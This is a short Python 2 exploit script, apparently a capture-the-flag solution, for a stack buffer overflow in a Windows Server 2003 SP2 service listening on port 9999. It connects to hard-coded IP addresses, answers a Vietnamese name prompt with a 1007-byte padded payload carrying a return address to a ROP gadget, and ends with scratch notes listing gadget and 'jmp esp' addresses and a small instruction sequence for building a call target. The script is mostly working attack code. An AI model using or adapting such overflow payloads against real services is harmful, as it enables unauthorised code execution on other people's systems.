__author__ = 'HuyNA'
'''

54.179.0.186 9999

window server 2003 SP2  /noexecute=optin

download file here.

regular expression: [ -~]+

'''

import sys
import os
import socket
import time
import telnetlib
import struct

def recv_until(sock, delim):
    buf = ""
    while True:
        c = sock.recv(1)
        buf += c
        if delim in buf:
            break
    return buf

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
local_host="54.179.0.186"
local_host="192.168.248.178"
local_port = 9999
s.connect((local_host, local_port))

# \r\nHello
recv_until(s,'Nhap vao ten cua ban: ')
#	Line 13245: 0x00514040: add esp, 0x1C ; pop ebp ; ret  ;  (2 found)
return_address = "\x40\x40\x51\x00"

data = 'a'*1007+ 'c'*4+'b'*0x10 + return_address+'\x80'*12+'\n'

s.send(data)

time.sleep(0.01)
print s.recv(1024)
print s.recv(1024)
print s.recv(1024)

'''
t = telnetlib.Telnet()
t.sock = s
t.interact()
'''

'''
2176
00555344
.rdata:00555344 60 76 65 63 74 6F 72 20+    szvectorconstructoriterator db '`vector constructor iterator',27h,0

004022E6 064 E8 75 00 00 00                  call    sub_402360              ; Call Procedure
push 21666636
pop eax
sub eax, 21264350
push eax
pop ebx
call ebx

.text:7D4D7944 53 65 74 4C 6F 63 61 6C+    szSetLocaleInfoW db 'SetLocaleInfoW',0  ; DATA XREF: .text:off_7D4D2698o
push 0x7D4D7944
pop eax

1574DC 43 6F 6E 6E 65 63 74 20+    szConnectsuccessNhapvaotencuaban db 'Connect success ',0Dh,0Ah
17E7E0
eax = 005574DC

b 00401040
start new at 004021A8

regular expression: [ -~]+
2135d70

004D31DD jmp esp
Line 5038: 0x005075e0: add byte [eax], al ; add esp, 0x18 ; pop esi ; ret  ;  (1 found)
'''
